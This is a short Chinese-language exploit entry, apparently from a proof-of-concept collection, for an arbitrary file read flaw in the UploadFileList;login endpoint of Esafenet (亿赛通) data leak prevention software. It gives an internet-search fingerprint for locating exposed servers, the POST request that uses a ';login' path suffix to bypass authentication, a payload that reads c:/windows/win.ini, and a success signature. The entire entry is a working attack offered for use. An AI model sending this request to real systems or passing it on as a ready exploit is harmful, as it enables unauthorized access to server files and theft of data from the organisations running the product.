# 亿赛通数据泄露防护UploadFileListlogin接口任意文件读取漏洞

亿赛通数据泄露防护UploadFileListlogin接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/document/UploadFileList;login HTTP/1.1`

**Payload**
```
command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
```
- **响应特征**：200 app